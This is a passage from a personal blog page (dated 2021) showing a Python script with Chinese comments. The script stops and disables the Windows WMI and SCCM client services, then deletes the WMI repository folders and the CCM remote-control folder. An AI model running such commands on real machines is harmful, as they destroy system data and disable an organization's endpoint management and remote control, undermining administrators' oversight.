        <span class="c1"># 停止服务</span>
        <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;sc&#39;</span><span class="p">,</span> <span class="s1">&#39;stop&#39;</span><span class="p">,</span> <span class="n">service_name</span><span class="p">],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;服务已停止：</span><span class="si">{</span><span class="n">service_name</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

        <span class="c1"># 禁用服务</span>
        <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;sc&#39;</span><span class="p">,</span> <span class="s1">&#39;config&#39;</span><span class="p">,</span> <span class="n">service_name</span><span class="p">,</span> <span class="s1">&#39;start=&#39;</span><span class="p">,</span> <span class="s1">&#39;disabled&#39;</span><span class="p">],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;服务已禁用：</span><span class="si">{</span><span class="n">service_name</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;操作服务 </span><span class="si">{</span><span class="n">service_name</span><span class="si">}</span><span class="s1"> 时发生错误：</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">clear_folder_contents</span><span class="p">(</span><span class="n">folder_path</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&#39;&#39;&#39;清理文件夹下的所有内容&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">folder_path</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># 删除文件夹下的所有文件和子目录</span>
            <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">folder_path</span><span class="p">):</span>
                <span class="n">item_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">folder_path</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">item_path</span><span class="p">):</span>
                    <span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">item_path</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">item_path</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;成功清理文件夹内容：</span><span class="si">{</span><span class="n">folder_path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;清理文件夹 </span><span class="si">{</span><span class="n">folder_path</span><span class="si">}</span><span class="s1"> 时发生错误：</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;路径不存在：</span><span class="si">{</span><span class="n">folder_path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="c1"># 停止并禁用服务</span>
    <span class="n">stop_and_disable_service</span><span class="p">(</span><span class="s1">&#39;winmgmt&#39;</span><span class="p">)</span>
    <span class="n">stop_and_disable_service</span><span class="p">(</span><span class="s1">&#39;CcmExec&#39;</span><span class="p">)</span>

    <span class="c1"># 定义文件夹路径</span>
    <span class="n">wbem_base_path</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">Windows</span><span class="se">\\</span><span class="s1">System32</span><span class="se">\\</span><span class="s1">wbem&#39;</span>
    <span class="n">auto_recover_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">wbem_base_path</span><span class="p">,</span> <span class="s1">&#39;AutoRecover&#39;</span><span class="p">)</span>
    <span class="n">repository_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">wbem_base_path</span><span class="p">,</span> <span class="s1">&#39;Repository&#39;</span><span class="p">)</span>
    <span class="n">remote_control_path</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">Windows</span><span class="se">\\</span><span class="s1">CCM</span><span class="se">\\</span><span class="s1">RemCtrl&#39;</span>

    <span class="c1"># 清理 wbem/AutoRecover 和 wbem/Repository 文件夹</span>
    <span class="n">clear_folder_contents</span><span class="p">(</span><span class="n">auto_recover_path</span><span class="p">)</span>
    <span class="n">clear_folder_contents</span><span class="p">(</span><span class="n">repository_path</span><span class="p">)</span>
    <span class="c1"># 清理 CCM/RemCtrl 文件夹</span>
    <span class="n">clear_folder_contents</span><span class="p">(</span><span class="n">remote_control_path</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
 




	</div>

	<div>
  	<center>
	<div class="pagination">
<ul class="pagination">
	 
				
    	<li class="prev"><a href="/2022/02/25/Declaration-of-the-Independence-of-Cyberspace/" class="alignleft prev"><i class="fa fa-arrow-circle-o-left"></i>Prev</a></li>
  		

        <li><a href="/archives"><i class="fa fa-archive"></i>Archive</a></li>

		
		   <li class="next"><a href="/2021/11/07/Install-Almond/" class="alignright next">Next<i class="fa fa-arrow-circle-o-right"></i></a></li>         
        
	
</ul>
</div>

    </center>
	</div>
	
	<!-- comment -->
	
<section id="comment">
  <h2 class="title">Comments</h2>

  <script data-isso="https://jhub.dtype.info/isso/" src="https://jhub.dtype.info/isso/js/embed.min.js"></script>
  <section id="isso-thread"></section>
  
</section>


	
	</div> <!-- col-md-9/col-md-12 -->
	
	
		<div class="col-md-3"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2021-11-12 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	

</div><!-- row -->

	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2026 Andrew
  
      with help from <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>.    
</p> </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>▲</span> 
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>



<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


</body>

</html>
